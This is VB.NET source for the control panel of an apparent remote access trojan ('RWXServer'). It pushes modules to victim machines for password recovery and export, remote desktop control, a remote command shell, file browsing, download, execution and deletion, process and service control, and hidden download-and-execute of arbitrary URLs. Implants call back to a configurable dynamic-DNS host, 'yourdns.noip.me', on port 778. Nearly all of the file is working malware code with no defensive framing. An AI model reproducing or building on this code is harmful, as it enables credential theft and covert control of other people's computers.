Imports System.IO
Imports System.Reflection

Public Class x
    Public endpoint As String = ""
    Public rdpendpoint As String = ""
    Public consoleendpoint As String = ""
    Public FMEndpoint As String = ""
    Public root As String = ""
    Public folder As String = ""
    Public rdpx As Integer = 0
    Public rdpy As Integer = 0

    Public Sub New(Title As String, ender As String)
        InitializeComponent()
        Me.Text = Title
        endpoint = ender
    End Sub

#Region "Form"
    Private Sub frmFunctions_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        frmMain.rdp.Remove(endpoint)
        frmMain.consoles.Remove(endpoint)
        frmMain.fm.Remove(endpoint)
        frmMain.frm.Remove(endpoint)
        frmMain.SendAnyPacket(rdpendpoint, CByte(frmMain.PacketHeader.Off))
        frmMain.SendAnyPacket(FMEndpoint, CByte(frmMain.PacketHeader.Off))
        frmMain.SendAnyPacket(consoleendpoint, CByte(frmMain.PacketHeader.EndConsole))
    End Sub

    Private Sub frmFunctions_Resize(sender As Object, e As EventArgs) Handles Me.Resize
        If Me.Height < 430 Then
            Me.Height = 430
        End If

        If Me.Width < 860 Then
            Me.Width = 860
        End If

        picRDP.Height = Me.Height - 80
        picRDP.Width = Me.Width - 150
    End Sub
#End Region

#Region "Password"
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles cmdExportPW.Click
        On Error Resume Next
        Dim saver As String = ""
        For i = 0 To lstPWs.Items.Count - 1
            saver += lstPWs.Items(i).Text & "||" & lstPWs.Items(i).SubItems(1).Text & "||" & lstPWs.Items(i).SubItems(2).Text & vbCrLf
        Next
        SaveFileDialog1.Title = "Export Passwords"
        SaveFileDialog1.Filter = "Text File|*.txt"
        SaveFileDialog1.FileName = ""
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            My.Computer.FileSystem.WriteAllText _
            (SaveFileDialog1.FileName, saver, True)
        End If

    End Sub

    Private Async Sub cmdgetPW_Click(sender As Object, e As EventArgs) Handles cmdgetPW.Click
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.PWRecovery.txt"))
        frmMain.Modulename = "PWRecovery"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub

#End Region

#Region "Process"
    Private Async Sub cmdgetProcess_Click(sender As Object, e As EventArgs) Handles cmdgetProcess.Click
        lstProc.Items.Add("Refreshing...")
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.GetProcess.txt"))
        frmMain.Modulename = "GetProcess"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub

    Private Async Sub KillProcessToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles KillProcessToolStripMenuItem.Click
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.KillProcess.txt"))
        frmMain.Modulename = "KillProcess"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        source = source.Replace("*-*PID*-*", lstProc.SelectedItems(0).SubItems(1).Text)

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
        cmdgetProcess.PerformClick()
    End Sub
#End Region

#Region "RDP"

    Private Sub picRDP_MouseUp(sender As Object, e As MouseEventArgs) Handles picRDP.MouseUp
        If chkmouse.Checked = True Then
            Try
                Dim p As System.Drawing.Point = e.Location
                Dim unscaled_p As System.Drawing.Point = New System.Drawing.Point()

                Dim w_i As Integer = picRDP.Image.Width
                Dim h_i As Integer = picRDP.Image.Height
                Dim w_c As Integer = picRDP.Width
                Dim h_c As Integer = picRDP.Height

                Dim imageratio As Single = w_i / h_i
                Dim containerratio As Single = w_c / h_c

                If (imageratio >= containerratio) Then
                    Dim scalefactor As Single = w_c / w_i
                    Dim scaledheight As Single = h_i * scalefactor
                    Dim filler As Single = Math.Abs(h_c - scaledheight) / 2
                    unscaled_p.X = (p.X / scalefactor) * 2
                    unscaled_p.Y = ((p.Y - filler) / scalefactor) * 2
                Else
                    Dim scalefactor As Single = h_c / h_i
                    Dim scaledwidth As Single = w_i * scalefactor
                    Dim filler As Single = Math.Abs(w_c - scaledwidth) / 2
                    unscaled_p.X = ((p.X - filler) / scalefactor) * 2
                    unscaled_p.Y = (p.Y / scalefactor) * 2
                End If
                If unscaled_p.X >= 0 And unscaled_p.Y >= 0 Then
                    If e.Button = Windows.Forms.MouseButtons.Left Then
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mouseup), "left", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    ElseIf e.Button = Windows.Forms.MouseButtons.Right Then
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mouseup), "right", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    Else
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mouseup), "mid", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    End If
                End If
            Catch : End Try
        End If
    End Sub

    Private Sub picRDP_MouseDown(sender As Object, e As MouseEventArgs) Handles picRDP.MouseDown
        If chkmouse.Checked = True Then
            Try
                Dim p As System.Drawing.Point = e.Location
                Dim unscaled_p As System.Drawing.Point = New System.Drawing.Point()

                Dim w_i As Integer = picRDP.Image.Width
                Dim h_i As Integer = picRDP.Image.Height
                Dim w_c As Integer = picRDP.Width
                Dim h_c As Integer = picRDP.Height

                Dim imageratio As Single = w_i / h_i
                Dim containerratio As Single = w_c / h_c

                If (imageratio >= containerratio) Then
                    Dim scalefactor As Single = w_c / w_i
                    Dim scaledheight As Single = h_i * scalefactor
                    Dim filler As Single = Math.Abs(h_c - scaledheight) / 2
                    unscaled_p.X = (p.X / scalefactor) * 2
                    unscaled_p.Y = ((p.Y - filler) / scalefactor) * 2
                Else
                    Dim scalefactor As Single = h_c / h_i
                    Dim scaledwidth As Single = w_i * scalefactor
                    Dim filler As Single = Math.Abs(w_c - scaledwidth) / 2
                    unscaled_p.X = ((p.X - filler) / scalefactor) * 2
                    unscaled_p.Y = (p.Y / scalefactor) * 2
                End If
                If unscaled_p.X >= 0 And unscaled_p.Y >= 0 Then
                    If e.Button = Windows.Forms.MouseButtons.Left Then
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mousedown), "left", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    ElseIf e.Button = Windows.Forms.MouseButtons.Right Then
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mousedown), "right", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    Else
                        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mousedown), "mid", unscaled_p.X.ToString, unscaled_p.Y.ToString)
                    End If
                End If
            Catch : End Try
        End If
    End Sub

    Private Sub picRDP_MouseMove(sender As Object, e As MouseEventArgs) Handles picRDP.MouseMove
        If chkmouse.Checked = True Then
            Try
                Dim p As System.Drawing.Point = e.Location
                Dim unscaled_p As System.Drawing.Point = New System.Drawing.Point()

                Dim w_i As Integer = picRDP.Image.Width
                Dim h_i As Integer = picRDP.Image.Height
                Dim w_c As Integer = picRDP.Width
                Dim h_c As Integer = picRDP.Height

                Dim imageratio As Single = w_i / h_i
                Dim containerratio As Single = w_c / h_c

                If (imageratio >= containerratio) Then
                    Dim scalefactor As Single = w_c / w_i
                    Dim scaledheight As Single = h_i * scalefactor
                    Dim filler As Single = Math.Abs(h_c - scaledheight) / 2
                    unscaled_p.X = (p.X / scalefactor) * 2
                    unscaled_p.Y = ((p.Y - filler) / scalefactor) * 2
                Else
                    Dim scalefactor As Single = h_c / h_i
                    Dim scaledwidth As Single = w_i * scalefactor
                    Dim filler As Single = Math.Abs(w_c - scaledwidth) / 2
                    unscaled_p.X = ((p.X - filler) / scalefactor) * 2
                    unscaled_p.Y = (p.Y / scalefactor) * 2
                End If
                If unscaled_p.X >= 0 And unscaled_p.Y >= 0 Then
                    frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Mousemove), unscaled_p.X.ToString + rdpx, unscaled_p.Y.ToString + rdpy)
                End If
            Catch : End Try
        End If
    End Sub

    Private Sub cmdquali_Click(sender As Object, e As EventArgs) Handles cmdquali.Click
        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Quali), cmbQuali.Text)
    End Sub

    Private Sub cmdRDPoff_Click(sender As Object, e As EventArgs) Handles cmdRDPoff.Click
        frmMain.SendAnyDataPacket(rdpendpoint, CByte(frmMain.PacketHeader.Off))
        frmMain.rdp(endpoint) = False
        cmdRDPoff.Enabled = False
        cmdRDPon.Enabled = True
        picRDP.Image = Nothing
    End Sub

    Private Async Sub cmdRDPon_Click(sender As Object, e As EventArgs) Handles cmdRDPon.Click
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.RDP.txt"))
        frmMain.Modulename = "RDP"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask
        frmMain.rdp(endpoint) = True
        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
        cmdRDPoff.Enabled = True
        cmdRDPon.Enabled = False
    End Sub

#End Region

#Region "Service"
    Private Async Sub cmdGetService_Click(sender As Object, e As EventArgs) Handles cmdGetService.Click
        lstService.Items.Add("Refreshing...")
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.GetServices.txt"))
        frmMain.Modulename = "GetServices"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub

    Private Async Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem1.Click
        Try
            'Dim _textStreamReader As StreamReader
            'Dim _assembly As [Assembly]
            Dim source As String
            Dim reader As New modINI
            '_assembly = [Assembly].GetExecutingAssembly()
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.StartService.txt"))
            frmMain.Modulename = "StartService"
            Dim MyTask As Task(Of String) = frmMain.GetPage()
            source = Await MyTask
            source = source.Replace("[service]", lstService.Items(lstService.SelectedItems(0).Index).SubItems(1).Text)

            frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
            cmdGetService.PerformClick()
        Catch : End Try
    End Sub

    Private Async Sub SuspendServiceToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SuspendServiceToolStripMenuItem.Click
        Try
            'Dim _textStreamReader As StreamReader
            'Dim _assembly As [Assembly]
            Dim source As String
            Dim reader As New modINI
            '_assembly = [Assembly].GetExecutingAssembly()
            '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.StopService.txt"))
            frmMain.Modulename = "StopService"
            Dim MyTask As Task(Of String) = frmMain.GetPage()
            source = Await MyTask
            source = source.Replace("[service]", lstService.Items(lstService.SelectedItems(0).Index).SubItems(1).Text)

            frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
            cmdGetService.PerformClick()
        Catch : End Try
    End Sub
#End Region

#Region "Software"
    Private Async Sub cmdGetSoftware_Click(sender As Object, e As EventArgs) Handles cmdGetSoftware.Click
        MessageBox.Show("Note: The refresh may take a while. Please be patient", frmMain.Label8.Text, MessageBoxButtons.OK, MessageBoxIcon.Information)
        lstSoftware.Items.Add("Refreshing...")
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.GetSoftware.txt"))
        frmMain.Modulename = "GetSoftware"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub
#End Region

#Region "CMD"
    Private Sub txtCommand_KeyPress(sender As Object, e As KeyPressEventArgs) Handles txtCommand.KeyPress
        If e.KeyChar = Microsoft.VisualBasic.ChrW(Keys.Return) Then
            If txtCommand.Text <> "exit" And txtCommand.Text <> "cls" Then
                frmMain.SendAnyDataPacket(consoleendpoint, CByte(frmMain.PacketHeader.Console), txtCommand.Text)
                txtCommand.Text = ""
            ElseIf txtCommand.Text = "cls" Then
                txtConsole.Text = ""
                txtCommand.Text = ""
            Else
                cmdStopCMD.PerformClick()
            End If
        End If
    End Sub

    Private Async Sub cmdStartCMD_Click(sender As Object, e As EventArgs) Handles cmdStartCMD.Click
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.Console.txt"))
        frmMain.Modulename = "Console"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask
        frmMain.consoles(endpoint) = True
        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
        cmdStartCMD.Enabled = False
        cmdStopCMD.Enabled = True
        txtCommand.Focus()
    End Sub

    Private Sub cmdStopCMD_Click(sender As Object, e As EventArgs) Handles cmdStopCMD.Click
        frmMain.SendAnyDataPacket(consoleendpoint, CByte(frmMain.PacketHeader.EndConsole))
        frmMain.consoles(endpoint) = False
        cmdStopCMD.Enabled = False
        cmdStartCMD.Enabled = True
        txtCommand.Text = ""
        txtConsole.Text = ""
    End Sub
#End Region

#Region "FileManager"
    Private Sub ListView1_DoubleClick(sender As Object, e As EventArgs) Handles lstContent.DoubleClick
        Try
            If lstContent.Items.Count > 0 And lstContent.FocusedItem.SubItems(0).Text = ".." Then
                If folder = root Then
                    Dim rooter() As String = root.Split("\")
                    root = rooter(0) & "\"
                    For i = 1 To UBound(rooter) - 2
                        root = root & rooter(i) & "\"
                    Next
                End If
                frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Content), root)
            ElseIf lstContent.Items.Count > 0 And lstContent.FocusedItem.SubItems(0).Text = "." Then
                If folder = root Then
                    Dim rooter() As String = root.Split("\")
                    root = rooter(0) & "\"
                End If
                frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Content), root)
            ElseIf lstContent.Items.Count > 0 And lstContent.FocusedItem.SubItems(1).Text = "Folder" Then
                If folder = root Then
                    root = root & lstContent.FocusedItem.SubItems(0).Text & "\"
                End If
                frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Content), root)
            End If
        Catch : End Try
    End Sub

    Private Async Sub cmdStartFile_Click(sender As Object, e As EventArgs) Handles cmdStartFile.Click
        'Dim _textStreamReader As StreamReader
        'Dim _assembly As [Assembly]
        Dim source As String
        Dim reader As New modINI
        '_assembly = [Assembly].GetExecutingAssembly()
        '_textStreamReader = New StreamReader(_assembly.GetManifestResourceStream("RWXServer.FileManager.txt"))
        frmMain.Modulename = "FileManager"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask
        frmMain.fm(endpoint) = True
        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
        cmdStartFile.Enabled = False
        cmdStopFile.Enabled = True
    End Sub

    Private Sub lstdrives_DoubleClick(sender As Object, e As EventArgs) Handles lstDrives.DoubleClick
        On Error Resume Next
        If lstDrives.Items.Count > 0 Then
            root = lstDrives.FocusedItem.SubItems(0).Text
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Content), root)
        End If
    End Sub

    Private Sub lstContent_SelectedIndexChanged(sender As Object, e As EventArgs) Handles lstContent.SelectedIndexChanged
        Try
            If lstContent.Items.Count > 0 And lstContent.FocusedItem.SubItems(1).Text <> "Folder" Then
                frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Preview), root & lstContent.FocusedItem.SubItems(0).Text)
            End If
        Catch : End Try
    End Sub

    Private Sub cmdStopFile_Click(sender As Object, e As EventArgs) Handles cmdStopFile.Click
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Off))
            frmMain.fm(endpoint) = False
            cmdStopFile.Enabled = False
            cmdStartFile.Enabled = True
            txtFolder.Text = ""
            lstDrives.Items.Clear()
            lstContent.Items.Clear()
            picPreview.Image = Nothing
            txtPreview.Text = ""
    End Sub

    Private Sub ExecuteFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles ExecuteFileToolStripMenuItem.Click
        If lstContent.SelectedItems.Count > 0 Then
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Execute), root & lstContent.FocusedItem.SubItems(0).Text)
        End If
    End Sub

    Private Sub DeleteFileFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteFileFolderToolStripMenuItem.Click
        If lstContent.SelectedItems.Count > 0 Then
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Delete), root & lstContent.FocusedItem.SubItems(0).Text)
        End If
    End Sub

    Private Sub RenameFileFolderToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RenameFileFolderToolStripMenuItem.Click
        If lstContent.SelectedItems.Count > 0 Then
            Dim newname As String
            newname = InputBox("New File-/Foldername", frmMain.Label8.Text, lstContent.FocusedItem.SubItems(0).Text)
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Rename), root & lstContent.FocusedItem.SubItems(0).Text, newname)
        End If
    End Sub

#End Region

#Region "Misc"
    Private Async Sub btnrun_Click(sender As Object, e As EventArgs) Handles btnrun.Click
        Dim source As String
        Dim reader As New modINI

        frmMain.Modulename = "DLExec"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        source = source.Replace("[url]", txtlink.Text)
        If chkrhidden.Checked = True Then
            source = source.Replace("'/\", "")
        End If

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub

    Private Async Sub cmdmsgboxSend_Click(sender As Object, e As EventArgs) Handles cmdmsgboxSend.Click
        Dim source As String
        Dim reader As New modINI

        frmMain.Modulename = "Messagebox"
        Dim MyTask As Task(Of String) = frmMain.GetPage()
        source = Await MyTask

        source = source.Replace("[title]", txtmsgboxTitle.Text)
        source = source.Replace("[text]", txtmsgboxText.Text)

        frmMain.SendAnyPacket(endpoint, CByte(frmMain.PacketHeader.Compile), source, reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "host", "yourdns.noip.me"), reader.ReadIni(System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase).Replace("file:\", Nothing) + "\Settings.dat", "Settings", "dataport", "778"), endpoint)
    End Sub

#End Region

    Private Sub DownloadFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadFileToolStripMenuItem.Click
        frmMain.dl.FileName = lstContent.FocusedItem.SubItems(0).Text
        frmMain.dl.Filter = "Any File|*.*"
        If frmMain.dl.ShowDialog = Windows.Forms.DialogResult.OK Then
            frmMain.SendAnyDataPacket(FMEndpoint, CByte(frmMain.PacketHeader.Download), root & lstContent.FocusedItem.SubItems(0).Text)
            Dim lvi As New ListViewItem
            lvi.Text = lstContent.FocusedItem.SubItems(0).Text
            lvi.SubItems.Add(lstContent.FocusedItem.SubItems(1).Text)
            lvi.SubItems.Add("0%")
            'lsttransfer.Items.Add(lvi)
        End If
    End Sub
End Class